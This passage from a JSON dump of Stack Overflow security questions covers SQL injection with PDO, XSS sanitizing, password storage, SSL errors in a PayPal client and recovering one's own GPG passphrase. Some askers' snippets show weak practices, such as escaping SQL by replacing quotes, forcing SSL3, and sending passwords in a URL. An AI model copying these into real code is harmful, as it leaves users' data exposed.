a password that he can type in the address bar to log him in, instead of the usual login form. So he would visit domain.com/page?p=the_password and then I would store his data in a session and give him a cookie with a session id (usual stuff) and redirect him to domain.com/page.</p>\n\n<p>How safe / unsafe is this? I'm doing this in PHP, but I guess it applies to any server-side language.</p>\n"},{"tags":["security","ldap","client-server","hard-coding"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12596240,"title":"How can I connect to LDAP from a smartphone without hardcoding the password?","body":"<p>Our Android app connects to an LDAP db for authentication and user data (email address, phone number, etc.). Until now, the app has connected to a piece of middleware that opens the connection to LDAP and performs operations for the app. The app just sends a basic request (like \"Authenticate the user, and grant them the role if they don't have it\"), and the middleware is set up to handle only those possible requests.</p>\n\n<p>Now, we've been asked to skip the middleware, and connect to LDAP straight from the app. The issue is that, as far as I can see, there's no way to <em>not</em> hardcode the password of the master LDAP user in the app, and I know .apk files are easy to decompile.</p>\n\n<p>Is there any way to securely connect directly to the LDAP from a client app on phones belonging to the general public without using middleware?</p>\n"},{"tags":["python","security","hash","md5"],"answer_count":2,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":106,"score":6,"question_id":12592501,"title":"Serialize MD5 computation-state and resume later?","body":"<p>I want to serialize/deserialize md5 context. But I don't know how to do it in Python.\nPseudocode of what I want to do.</p>\n\n<pre><code>import md5\n# Start hash generation\nm = md5.new()\nm.update(\"Content\")\n\n# Serialize m\nserialized_m = serialize(m)\n\n# In another function/machine, deserialize m\n# and continue hash generation\nm2 = deserialize(serialized_m)\nm2.update(\"More content\")\nm2.digest()    \n</code></pre>\n\n<p>There are C++ libraries for this. Is there one for Python? Why doesn't the md5 library support it? Are there security concerns? Thanks.</p>\n\n<p>Edited:\nI want to do this because for example, an HTTP server wants to accept streaming data in different HTTP requests. It would be convenient to serialize md5 context somehow between requests.</p>\n"},{"tags":["security",".htaccess","joomla"],"answer_count":5,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":852,"score":3,"question_id":722973,"title":"Is it a security risk not to use a .htaccess file?","body":"<p>I have a Joomla site www.siteA.com and another Joomla site www.siteA.com/siteB.</p>\n\n<p>I have a .htaccess -file at siteA, but not at siteB.</p>\n\n<p><strong>Is it a security risk not to have a .htaccess -file at siteB?</strong></p>\n"},{"tags":["security","rsa","keytool"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12605467,"title":"generated a rsa key with keytool - where is it?","body":"<p>I created a RSA key pair using keytool, but I need to get the public key.\nI've read all around but can't find this information anywhere. </p>\n\n<p>Is there a way to get that information? Or even where are the files located in windows 7?</p>\n\n<p>Any suggestion will help..</p>\n\n<p>thanks!</p>\n"},{"tags":["php","html","css","security","codeigniter"],"answer_count":4,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":84,"score":0,"question_id":12623373,"title":"Apart from SQL injection what other security vulnerabilities should I be aware of in a website?","body":"<p>I generally work using the codeigniter framework, which provides some help with preventing sql injection, e.g. xss clean of form input data. </p>\n\n<p>I have a basic idea of what sql injection is and how to stop it happening, but a friend of mine has a very basic site in which the only user input was a cgi form to email script - parts of the site were replaced with some adult content.</p>\n\n<p>So I am curious how someone could have gained control of such a basic site and also, what kind of vulnerabilities I should be aware of when building my own sites?</p>\n"},{"tags":["java","security","properties"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":12610255,"title":"Set a Java Security Property to null","body":"<p>I have seen that one can null (or clear) a System property by using <code>System.clearProperty(\"propertyName\")</code>.  However, I am unable to locate a similar mechanism for Security.</p>\n\n<p>How does one perform the equivalent of <code>Security.clearProperty(\"propertyName\")</code>?  </p>\n\n<p>Obviously, using <code>Security.setProperty(\"propertyName\", null)</code> does not work for the same reasons it does not work for <code>System.setProperty(\"propertyName\", null)</code>.</p>\n\n<p>I would like to do this as there are optional security properties that may not be updated when required properties are changed.  I would like the optional properties to reset to their default values when a change is made to the required properties.</p>\n"},{"tags":["php","security","pdo","sql-injection"],"answer_count":7,"favorite_count":53,"up_vote_count":68,"down_vote_count":1,"view_count":15818,"score":67,"question_id":134099,"title":"Are PDO prepared statements sufficient to prevent SQL injection?","body":"<p>Let's say I have code like this:</p>\n\n<pre><code>$dbh = new PDO(\"blahblah\");\n\n$stmt = $dbh-&gt;prepare('SELECT * FROM users where username = :username');\n$stmt-&gt;execute( array(':username' =&gt; $_REQUEST['username']) );\n</code></pre>\n\n<p>The PDO documentation says</p>\n\n<blockquote>\n  <blockquote>\n    <blockquote>\n      <blockquote>\n        <p>The parameters to prepared statements don't need to be quoted; the driver handles it for you.</p>\n      </blockquote>\n    </blockquote>\n  </blockquote>\n</blockquote>\n\n<p><strong>Is that truly all I need to do to avoid SQL injections?  Is it really that easy?</strong></p>\n\n<p>You can assume MySQL if it makes a difference.  Also, I'm really only curious about the use of prepared statements against SQL injection.  In this context, I don't care about XSS or other possible vulnerabilities.</p>\n"},{"tags":["wordpress","security","http","ssl","https"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12621656,"title":"HTTPS to HTTP Redirect for one folder","body":"<p>I have a problem where I have a site that was HTTPS enabled in areas for secure content, but also has a wordpress blog at /blog/</p>\n\n<p>This all works fine, and theres no REAL problem, but to be on the safe side of things, if someone accessed with /blog/ folder using https (they would have to manually type <a href=\"https://domain.com/blog/\" rel=\"nofollow\">https://domain.com/blog/</a>) it breaks alot of the content in the blog.</p>\n\n<p>I want to set up a rewrite rule in the .htaccess to send any https requests on the /blog/ folder to http</p>\n\n<p>Is this possible?</p>\n"},{"tags":["java","security","xss","sanitization","owasp"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":91,"score":2,"question_id":12558471,"title":"How to allow specific characters with OWASP HTML Sanitizer?","body":"<p>I am using the OWASP Html Sanitizer to prevent XSS attacks on my web app. For many fields that should be plain text the Sanitizer is doing more than I expect. </p>\n\n<p>For example: </p>\n\n<pre><code>HtmlPolicyBuilder htmlPolicyBuilder = new HtmlPolicyBuilder();\nstripAllTagsPolicy = htmlPolicyBuilder.toFactory();\nstripAllTagsPolicy.sanitize('a+b'); // return a&amp;#43;b\nstripAllTagsPolicy.sanitize('foo@example.com'); // return foo&amp;#64;example.com\n</code></pre>\n\n<p>When I have fields such as email address that have a <code>+</code> in it such as <code>foo+bar@gmail.com</code> I end up with the wrong data in the the database. So two questions: </p>\n\n<ol>\n<li>Are characters such as <code>+ - @</code> dangerous on their own do they really need to be encoded? </li>\n<li>How do I configure the OWASP html sanitizer to allow specific characters such as + - @?</li>\n</ol>\n\n<p><strong>Question 2 is the more important one for me to get an answer to.</strong> </p>\n"},{"tags":["apache2","security","database","access-control"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12621185,"title":"Apache deny access to images folder, but still able to display via <img> on site","body":"<p>I have an images folder on my site, let's call it <code>/images/</code> where I keep a lot of images.  I don't want anyone to have direct access to the images via the web, so I put a new directive in my Apache config that achieves this:</p>\n\n<pre><code>&lt;Directory \"/var/www/images/\"&gt;\n    Options Includes\n    AllowOverride All\n    Order allow,deny\n    Deny from All\n&lt;/Directory&gt;\n</code></pre>\n\n<p>This is working, but it is blocking out ALL ACCESS, and I can't show the images anymore through my web pages.  I guess this makes sense.  So how do I selectively control access to these images?  </p>\n\n<p>Basically I only want to display certain images through certain webpages and to certain users.  What is best way to do this?  Do I need to save the images to the database?</p>\n\n<p>Tim</p>\n"},{"tags":["php","mysql","security","injection"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":1,"view_count":83,"score":3,"question_id":12606193,"title":"Is this string replacement enough against SQL injection attacks?","body":"<p>I'm trying to evaluate a sort of customized <code>CMS</code>. The protection the devoloper used against <code>SQL</code> attacks is:</p>\n\n<pre><code> str_replace(\"'\", \"\\'\", $_POST[$variable]);\n</code></pre>\n\n<p>Is this good enough, or there're ways to exploit this to inject <code>SQL</code> code?</p>\n\n<p>PS: I know the standard way is using <code>mysql_real_escape_string()</code>, but I'm trying to get an idea of the general quality of the code. </p>\n"},{"tags":["security","desktop-recording"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12615617,"title":"Prevent screen capture software from monitoring input fields","body":"<p>The obstacle I am trying to overcome is with screen recording software that monitors the computer while in use. Workstations use common technologies like RDP and Citrix XenApp. There are a few details which should be seen by the user via a browser window input fields but are best left unrecorded. Physical attacks aside, is there any standard way of handling this?</p>\n\n<p>I did question printing said information and using stylesheets to hide it from the screen, but this really isn't a viable option.</p>\n"},{"tags":["ruby-on-rails","security","deployment"],"answer_count":5,"favorite_count":9,"up_vote_count":29,"down_vote_count":0,"view_count":7137,"score":29,"question_id":18290,"title":"How Do You Secure database.yml?","body":"<p>Within Ruby on Rails applications database.yml is a plain text file that stores database credentials.</p>\n\n<p>When I deploy my Rails applications I have an after deploy callback in my Capistrano \nrecipe that creates a symbolic link within the application's /config directory to the database.yml file. The file itself is stored in a separate directory that's outside the standard Capistrano /releases directory structure. I chmod 400 the file so it's only readable by the user who created it.</p>\n\n<ul>\n<li>Is this sufficient to lock it down? If not, what else do you do?</li>\n<li>Is anyone encrypting their database.yml files?</li>\n</ul>\n"},{"tags":["database","security","web-applications"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":12613906,"title":"Data security in web application hosted on internet","body":"<p>I'm plannig to host an application on Internet which allows corporates to enter employees personal data and create some reports. Since there would be personal information I want the each corporate account admin to configure database connection details when the account is created and the application will store the information in that database for the respective account. The user will configure their firewall to accept connection from the server where my application is hosted and obviously assumes the responsibility of data security. I'm thinking about this idea to avoid any issues with security attacks. This may sound totally dumb but I want opinion from others. Feel free to provide your comments.</p>\n"},{"tags":["security","encoding","xor"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":191,"score":2,"question_id":10645705,"title":"XOR encrypting and decryption key","body":"<p>It is possible to get the key used to encrypt a secuence of characters using xor?</p>\n\n<h1>Example</h1>\n\n<p>Lets say that I Have the following string: 1456, so:</p>\n\n<ul>\n    <li>1 - 49 ascii - 00110001 binary</li>\n    <li>4 - 52 ascii - 00110100 binary</li>\n    <li>5 - 53 ascii - 00110101 binary</li>\n    <li>6 - 54 ascii - 00110110 binary</li> \n</ul>\n\n<p>Key: 100</p>\n\n<p>Then I do the following: 1 ^ 100 (talking in binary: 00110001 ^ 01100100), and get the following result: \"UPQR\", how do I know that I used the key 100 in xor to encrypt \"1456\" getting \"UPQR\" as the result.</p>\n\n<p>Thanks in advance!</p>\n"},{"tags":["asp.net","security"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":60,"score":1,"question_id":12611183,"title":"Is a WebService call containing a Username and Password any less secure than logging into a site?","body":"<p>We created a site for a customer a while back that has no site certificate/SSL.  It's just got a basic asp_net login system.</p>\n\n<p>You can't buy anything from the site and it doesn't hold personal details - it just shows the stock and gives the users a telephone number where they can phone up and buy the stock. </p>\n\n<p>One of our users has their own system and wants to grab bits of info via a WebService - we'd intended to just put a WebService with a WebMethod that took Username, Password and an ID and then passed some info back to their system.</p>\n\n<p>One of the developers says this would make the system much less secure as the WebMethod call with the Username and Password is much less secure than the login system on the site.  </p>\n\n<p>Is this WebMethod call really any less secure than the login system on the site?</p>\n"},{"tags":["windows","security","store","secret"],"answer_count":1,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":47,"score":2,"question_id":12602234,"title":"Is there any more securely way to protect and store a password than Windows DPAPI do?","body":"<p>Is there any more securely way to protect and store a password than Windows DPAPI do?</p>\n\n<p>My program needs to store a secret (something like credentials) to do automatic logins on Windows, and this secret have to be shared with other users accounts because the program can be run on different accounts but sharing the credentials.</p>\n\n<p>I need to protect this secret from tampering to avoid an attacker to inject his own credentials and take the control. If the attacker has phisical access I know that there is nothing we can do, but.... currently, what is the best way to store and protect this secret?</p>\n"},{"tags":["asp.net","web-services","security"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":46,"score":2,"question_id":12610217,"title":"What is the risk of someone eavesdropping on a webservice when it's being called by its own server?","body":"<p>Our company website is made up of several .NET projects all on the same server in addition to the big main site in ColdFusion. To reduce code duplication we wrote a webservice that these projects can call for basic functions. For example we have a service were you give it a user ID you get back some information about the user (no passwords, but things like an address). What I am concerned about is someone poking their electronic nose in and catching some information we don't want them to have. Is this a valid concern or will the information from the webservice stay internal since it and the projects calling it are on the same server? </p>\n\n<p>So our webservices are all like www.companyname.com/webservices/webserviceuser.asmx and the .NET web projects are all like www.companyname.com/admin/project1/ or www.companyname.com/edituser/ Since they all share the same domain name, will the information get out to the general internet?</p>\n\n<p>Also is it possible to add security to the webservice to confirm that the caller is an internal application (even if it's just testing the URL of the page calling it)?</p>\n\n<p>Thank you in advance.</p>\n"},{"tags":["java","security","rest","ssl"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":12610356,"title":"SSL and authenticating users","body":"<p>I have a REST API which clients connect over SSL (self signed cert 2048bit)</p>\n\n<p>I was thinking of implementing the following security </p>\n\n<ol>\n<li>The client requests a RSA public key from the server</li>\n<li>Encrypts the username / password </li>\n<li>Adds these to the header of EVERY REST call allowing the server to be stateless </li>\n</ol>\n\n<p>The application involves users adding credit cards (the numbers themselves are encrypted) and purchasing products so security is critical </p>\n\n<p>We also have very limited time from a iphone client point of view so I was hoping if the above would be suitable? </p>\n"},{"tags":["java","security","java-ee","web-security","srp-protocol"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":76,"score":0,"question_id":12148144,"title":"Secure Remote Password protocol on application level","body":"<p>I'm writing a Java EE application, which allows new users to register themselves and then log in over the Internet. I'm storing the credentials an a db.</p>\n\n<p>Now, there are several ways to do that, e.g.:</p>\n\n<ul>\n<li>send username and password, preferably over a TLS/SSL connection</li>\n<li>send username and a hashcode of the password, preferably over a TLS/SSL connection</li>\n<li>use the Secure Remote Password protocol (preferably over a TLS/SSL connection ?)</li>\n</ul>\n\n<p>Reading some articles, it seems the Secure Remote Password Protocol (SRP) is the way to go.</p>\n\n<p>But then reading some other articles it seems as this is only used on some low-level layers, e.g. such as TLS/SSL itself.</p>\n\n<p>I still think, it's recommended to use the Secure Remote Password Protocol on application level.</p>\n\n<p>Is this correct? Or are there some good reasons why this is not needed on application level?</p>\n"},{"tags":["javascript","security","backbone.js","ember.js"],"answer_count":1,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":92,"score":2,"question_id":12606053,"title":"Securing UI in a one page js application","body":"<p>Let me start off by saying that I do understand that one should never attempt to secure anything in javascript on the client side.  My question is referring to UI that some users would see and others would not.  Usually this UI also has some sort of logic bound to it.  Whether it be Backbone or Ember, what are some of the normal practices for showing or hiding different parts of the UI depending on user roles.</p>\n\n<p>My initial thought was to load different js depending on the currently signed in user.  On top of this, loading view templates async also came to mind.  I would love to hear other ideas and patterns though.  Keep in mind that this is assuming the backend API that the client communicates with is already secure for the given user.  So even if they were to view a secure UI component, it would not work correctly.</p>\n"},{"tags":["java","security","encryption","cryptography","sha-1"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":73,"score":0,"question_id":12577737,"title":"sha1 encryption with passPhrase ,saltValue,passwordIterations,initVector,keySize","body":"<p>I'm developing java application and I was asked to generate secure code using following information.</p>\n\n<pre><code>Value to be encrypted =\"test1234\";\n\npassPhrase = \"testValue\"\nsaltValue  = \"testValue\"\nhashAlgorithm = \"SHA1\"\npasswordIterations = 2\ninitVector = \"testValue\"\nkeySize = 256\n</code></pre>\n\n<p>Could some one kindly let me know what is the approach to generate hash value using SHA1 algorithm based on above mention values.</p>\n"},{"tags":["javascript","security","web-applications"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12605366,"title":"Verifying the validity of the data sent from WebApp to Web Service","body":"<p>I am building a WebApp which connects to my server through a web service.\nUsers (there is no login) which use the webapp can send their scores to the\nserver.</p>\n\n<p>The code is written mostly in javscript, so anyone can read it.</p>\n\n<p>As I know there is no 100% gurantee method of doing this, I am just looking for ideas\nhow to make it as hard as possible for users to send false scores.</p>\n\n<p>Ideas?\n10X! </p>\n\n<p><em><strong>EDIT</em></strong></p>\n\n<p>The server side web service is an asmx (.net) web service hosted on an IIS.\nI can modify it as needed.</p>\n"},{"tags":["security","http","rest","asp.net-web-api","restful-authentication"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":100,"score":3,"question_id":12606423,"title":"How to send secure token from RESTful service?","body":"<p>I am building a RESTful service using ASP.NET Web API with custom token based authentication. The client will send credentials on the first call. The service will create an encrypted token using the user details and this token will be used for authentication from this point onwards. Now the service needs to send this token back to the client. Initially I kept the token in a HTTP custom response header so that the client can read the value independent of the data returned by the service. This worked well when client and service are in the same domain, but failed in Cross domain scenario. I have CORS enabled my Service and added all kinds of headers like  \"Access-Control-Expose-Headers\", \"Access-Control-Allow-Origin: *\" etc. But the cross domain client is not able to read the custom response header I created which is \"SecureToken:\". I saw in couple of posts that web browsers have some issues with reading custom response headers in cross domain scenarios. So now I am thinking of sending the secure token through a common base class of all the ViewModel/data objects sent from the service. </p>\n\n<p>From this context I have couple of questions:</p>\n\n<ol>\n<li><p>What is the best place to send custom secure tokens. Is it in response header or as a common property in the base class of the ViewModel/data classes? </p></li>\n<li><p>is there a standard HTTP response header that I can use to send token and custom information so that even cross domain clients can also read it?  </p></li>\n</ol>\n\n<p>Any help will be greatly appreciated! Thanks!</p>\n"},{"tags":["security","client-side"],"answer_count":8,"favorite_count":4,"up_vote_count":9,"down_vote_count":0,"view_count":1185,"score":9,"question_id":1380168,"title":"Does it make security sense to hash password on client end","body":"<p>If you were to hash a user's password prior to sending it across the line and leaving it in plain-text in memory, would this improve the security of the application?</p>\n\n<p>I would assume this mitigates a small fraction of vulnerabilities by protecting the data stored in the clients memory.  But really if we're worried about someone reading the client's memory there are probably bigger problems that we can't address.</p>\n\n<p>There's something that doesn't feel right about hashing on the client's end.</p>\n\n<p>Is password hashing on the client end a common practice?  Are there any other advantages or disadvantages to doing it?</p>\n\n<p>EDIT:\nGiven the communication channel is secure (SSL).  Under what conditions would it be acceptable and worthwhile to use such an approach.   I'm asking this because it was suggested by a \"security professional\" that I use such a scheme during some application functions.</p>\n"},{"tags":[".net","security","ssl","certificate"],"answer_count":2,"favorite_count":2,"up_vote_count":9,"down_vote_count":0,"view_count":1528,"score":9,"question_id":9242724,"title":"SSL Failures - Recieving SSL/TLS exception when using HttpWebRequest with client certificate","body":"<p>I have a Windows 2008 Server with IIS 7 which using a .NET C# Application to send requests to PayPal to process payments. A few months ago I installed a Certificate which was purchased by Verisign. After installation, I was able to run my WebClient code to create SSL Connections successfully, and process payments via the PayPal NVP API (Name Value Pair). </p>\n\n<p>Recently, I have been receiving an error during SSL Transaction. The specific error is as follows:</p>\n\n<p><strong>Could not create SSL/TLS secure channel</strong></p>\n\n<p>I've checked everything I could think of, and read many articles on StackOverflow and other places on the net.</p>\n\n<p>The best resource I found was this:</p>\n\n<p>The request was aborted: Could not create SSL/TLS secure channel</p>\n\n<p>Lookup the error in this article <a href=\"http://support.microsoft.com/kb/915599\">http://support.microsoft.com/kb/915599</a>  Resolution J.  It also may be that you are not supplying a client certificate.  Most likely this is an issue with TLS or SSL3 being used and the server not understanding it.</p>\n\n<p><a href=\"http://blogs.msdn.com/b/jpsanders/archive/2009/01/07/you-receive-one-or-more-error-messages-when-you-try-to-make-an-http-request-in-an-application-that-is-built-on-the-net-framework-2-0.aspx\">http://blogs.msdn.com/b/jpsanders/archive/2009/01/07/you-receive-one-or-more-error-messages-when-you-try-to-make-an-http-request-in-an-application-that-is-built-on-the-net-framework-2-0.aspx</a></p>\n\n<p>And here is a list of all the other resources I've tried reading and implimenting their solutions:</p>\n\n<p><strong>Various Links I've Tried:</strong></p>\n\n<p><a href=\"http://support.microsoft.com/kb/901183\">http://support.microsoft.com/kb/901183</a></p>\n\n<p><a href=\"http://stackoverflow.com/questions/1600743/could-not-create-ssl-tls-secure-channel-could-the-problem-be-a-proxy-server\">Could not create SSL/TLS secure channel - Could the problem be a proxy server?</a></p>\n\n<p><a href=\"http://stackoverflow.com/questions/5353771/the-request-was-aborted-could-not-create-ssl-tls-secure-channel\">The request was aborted: Could not create SSL/TLS secure channel</a></p>\n\n<p><a href=\"http://stackoverflow.com/questions/8692532/the-request-was-aborted-could-not-create-ssl-tls-secure-channel-decrypt-retur\">The request was aborted: Could not create SSL/TLS secure channel - Decrypt returned SEC_I_RENEGOTIATE</a></p>\n\n<p><a href=\"http://social.msdn.microsoft.com/forums/en-US/netfxnetcom/thread/99d49286-5c3a-4311-a1e3-499f035ce979/\">http://social.msdn.microsoft.com/forums/en-US/netfxnetcom/thread/99d49286-5c3a-4311-a1e3-499f035ce979/</a></p>\n\n<p><a href=\"http://blogs.msdn.com/b/jpsanders/archive/2009/01/07/you-receive-one-or-more-error-messages-when-you-try-to-make-an-http-request-in-an-application-that-is-built-on-the-net-framework-2-0.aspx\">http://blogs.msdn.com/b/jpsanders/archive/2009/01/07/you-receive-one-or-more-error-messages-when-you-try-to-make-an-http-request-in-an-application-that-is-built-on-the-net-framework-2-0.aspx</a></p>\n\n<p><a href=\"http://forums.iis.net/t/1156690.aspx\">http://forums.iis.net/t/1156690.aspx</a></p>\n\n<p><strong>I have tried the following solutions:</strong></p>\n\n<ol>\n<li>Reinstall the certificate, and placed it into various stores (Personal, LocalComputer)</li>\n<li><p>Added this ServiceManager code:</p>\n\n<pre><code>ServicePointManager.Expect100Continue = true;\nServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3;\n</code></pre></li>\n<li><p>Enabled logging to gain more verbose details</p></li>\n<li>Various other solutions listed in the above links</li>\n</ol>\n\n<p>What is so frustrating is that this was working fine a few months ago, and now I receive this error. At first, I thought the cert expired, but it appears to be fine.</p>\n\n<p>It could be a Service Pack or Hotfix for Windows Server has created a new setting or scenario which breaks SSL. I figured that re-installing the cert would solve that. </p>\n\n<p>It is important to note that when I reinstalled, I simply added it to the various stores (Double Click the cert and install). I did not create a \"Certificate Request\". Since its already installed and bound to the SSL Port of my IIS Application, it should be ok.</p>\n\n<p><strong>This is the code that creates the web request:</strong> </p>\n\n<pre><code>     public static Hashtable DoWebReq(string strNVP, string strNVPSandboxServer)\n    {\n        ServicePointManager.Expect100Continue = true;\n        ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3;\n\n        string _strNVP = strNVP; \n\n        //Create web request and web response objects, make sure you using the correct server (sandbox/live)\n        var wrWebRequest = (HttpWebRequest)WebRequest.Create(strNVPSandboxServer);\n        wrWebRequest.Method = \"POST\"; // POST\n\n        var requestWriter = new StreamWriter(wrWebRequest.GetRequestStream());\n\n\n        requestWriter.Write(_strNVP);\n        requestWriter.Close();\n\n        // Get the response.\n        var hwrWebResponse = (HttpWebResponse)wrWebRequest.GetResponse();\n        var responseReader = new StreamReader(wrWebRequest.GetResponse().GetResponseStream());\n\n        //and read the response\n        string responseData = responseReader.ReadToEnd();\n        responseReader.Close();\n\n        string result = System.Web.HttpContext.Current.Server.UrlDecode(responseData);\n\n        string[] arrResult = result.Split('&amp;');\n        Hashtable htResponse = new Hashtable();\n        string[] responseItemArray;\n        foreach (string responseItem in arrResult)\n        {\n            responseItemArray = responseItem.Split('=');\n            htResponse.Add(responseItemArray[0], responseItemArray[1]);\n        }\n\n        return htResponse; \n    }\n</code></pre>\n\n<p><strong>Here are a collection of screen shots to show the various components of the SSL Machine:</strong></p>\n\n<p>This is the SSL Binding Settings in IIS:\n<img src=\"http://i.stack.imgur.com/6f1ER.jpg\" alt=\"SSL Bindings\"></p>\n\n<p>Here is an overview of the installed Certs:\n<img src=\"http://i.stack.imgur.com/9NSBx.jpg\" alt=\"certs1\"></p>\n\n<p>This is the Error I receive:\n<img src=\"http://i.stack.imgur.com/qupnX.jpg\" alt=\"SSL Error\"></p>\n\n<p><img src=\"http://i.stack.imgur.com/KYAQ4.jpg\" alt=\"certs2\"></p>\n\n<p>Certs Installed:\n<img src=\"http://i.stack.imgur.com/P8TOA.jpg\" alt=\"enter image description here\"></p>\n\n<p>Certificate Details\n<img src=\"http://i.stack.imgur.com/SMaZ8.jpg\" alt=\"enter image description here\"></p>\n\n<p>Any advice on fixing this error would be most appreciated. Some possibilities I've considered but not addressed are:</p>\n\n<ol>\n<li>Could the request be taking too long? It seems fast enough... but I've read this could be a problem.</li>\n<li>In Internet Explorer, I do see the Green \"SSL Bar\" which shows this site is verified as being secure. This tells me the Cert is installed correctly, is this true?</li>\n<li>Is there a simple test I can perform with a HTTP request of some kind to help narrow down the source of the problem?</li>\n<li>Could this have anything to do with PayPal? Is it possible paypal is rejecting the request due to credentials on their end? </li>\n<li>Would implementing an <a href=\"http://msdn.microsoft.com/en-us/library/k8z4ffe4%28vs.71%29.aspx\">ICertificatePolicy Interface</a> be of any help in debugging the issue? I'm hoping I can just fix it.</li>\n</ol>\n\n<p>I would think that either the SSL would work or not, it has no bearing/dependency on PayPal at all... but I could be wrong.</p>\n\n<p>I feel like I should be able to just use the Name Value Pair URL which is built by the WebClient class, and send that over the pipe via IE and receive a response.</p>\n\n<p>Thank you very much for taking a look.</p>\n"},{"tags":["html","asp.net-mvc","security"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":62,"score":4,"question_id":12604810,"title":"How do I prevent my HTML from being exploitable while avoiding GUIDs?","body":"<p>I've recently inherited a ASP.NET MVC 4 code base. One problem I noted was the use of some database ids (ints) in the urls as well in html form submissions. The code in its present state is exploitable through both URL tinkering and creating custom HTML posts with different numbers.</p>\n\n<p>Now while I can easily fix the URL problems by using session state or additional auth checks i'm less sure about the database ids that get embedded into the HTML that the site spits out (i.e. I give them a drop down to fill). When the ids come back in a post how can I be sure I put them there as valid options?\nWhat is considered \"best practice\" in terms of addressing this problem? </p>\n\n<p>While I appreciate I could just \"GUID it up\" I'm hesitant to do so because I find them a pain in the ass to work with when debugging databases. </p>\n\n<p>Do I have a choice here? Must I GUID to prevent easy guessing of ids or is there some kind of DRY mechanism I can use to validate the usage of ids as they come back into the site?</p>\n\n<p>UPDATE: A commenter asked about the exploits I'm expecting. Lets say I spit out a HTML form with a drop down list of all the locations one can import \"treasure\" from. The id of the locations that the user owns are 1,2 and 3, these are provided in the HTML. But the user examines the html, fiddles with it and decides to put together a POST with the id of 4 selected. 4 is not his location, its someone else's.</p>\n"},{"tags":["php","security","input","xss"],"answer_count":7,"favorite_count":3,"up_vote_count":8,"down_vote_count":1,"view_count":1416,"score":7,"question_id":3974221,"title":"Is there a definitive anti-XSS library for PHP?","body":"<p>I already know how XSS works, but finding out all the many different ways to inject malicious input is not an option.</p>\n\n<p>I saw a couple libraries out there, but most of them are very incomplete, ineficient, or GPL licensed (when will you guys learn that GPL is not good to share little libraries! Use MIT)</p>\n"},{"tags":["security","gpg","gnupg","gpgme"],"answer_count":2,"favorite_count":1,"up_vote_count":7,"down_vote_count":0,"view_count":4207,"score":7,"question_id":856912,"title":"Best way to soft brute-force your own GPG/PGP passphrase?","body":"<p>I created a nice long passphrase, used it a few times, then forgot it ;) The twist is, I know the general theme and probably almost all of the characters. The perfectionist in me doesn't want to revoke the key or anything like that (and I think I need the passphrase to revoke it anyway, right?). I feel I should be able to have a good go at this by brute-forcing the likely layouts/characters that I've got wrong/mis-typed. I wrote a C program to produce such combinations. Unfortunately I don't have the code to hand (I'll go with the \"it's not relevant\" excuse for now ;). I also came across some <a href=\"http://www.vanheusden.com/nasty/\" rel=\"nofollow\">code</a> on the web using GPGME to do exactly this as a proof-of-concept. It had the comment \"this could easily be 100 times faster\". Problem is, profiling the code shows the bottleneck to be the GPGME call itself. Is this expected, or is it a limitation of GPGME that could be solved using the full library or a dedicated implementation?</p>\n\n<p>How would you go about doing this? Obviously this method is infeasible for any decent <em>unknown</em> passphrase, but I think the key is that I know <em>what</em> I typed without knowing the exact formatting of <em>how</em> I typed it - should be feasible, no?</p>\n"},{"tags":["android","security","wifi","android-wifi"],"answer_count":3,"favorite_count":3,"up_vote_count":3,"down_vote_count":0,"view_count":1477,"score":3,"question_id":6866153,"title":"android: Determine security type of wifi networks in range (without connecting to them)","body":"<p>I can enumerate all wifi networks in range (using startScan + SCAN_RESULTS_AVAILABLE_ACTION + getScanResults) and get their SSID and BSSID values, but I can't figure out how to determine the security type of each network.</p>\n\n<p>In my main object:</p>\n\n<pre><code>    IntentFilter intentFilter = new IntentFilter();\n    intentFilter.addAction(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION);\n    registerReceiver(scanReceiver, intentFilter);\n    ((WifiManager)getSystemService(Context.WIFI_SERVICE)).startScan();\n</code></pre>\n\n<p>In my scanReceiver object:</p>\n\n<pre><code>public void onReceive(Context c, Intent intent) {\n    if (WifiManager.SCAN_RESULTS_AVAILABLE_ACTION.equals(intent.getAction())){\n        mainObject.scanComplete();\n    }\n}\n</code></pre>\n\n<p>And again in my main object:</p>\n\n<pre><code>public void scanComplete()\n{\n    List&lt;ScanResult&gt; networkList = ((WifiManager)getSystemService.(Context.WIFI_SERVICE)).getScanResults();\n    for (ScanResult network : networkList)\n    {\n        &lt;do stuff&gt;\n    }\n}\n</code></pre>\n\n<p>The code works insofar that scanComplete eventually gets called, and I can successfully enumerate all nearby wifi networks and get their SSID and BSSID, but I can't figure out how to determine their security type.</p>\n\n<p>Is there a 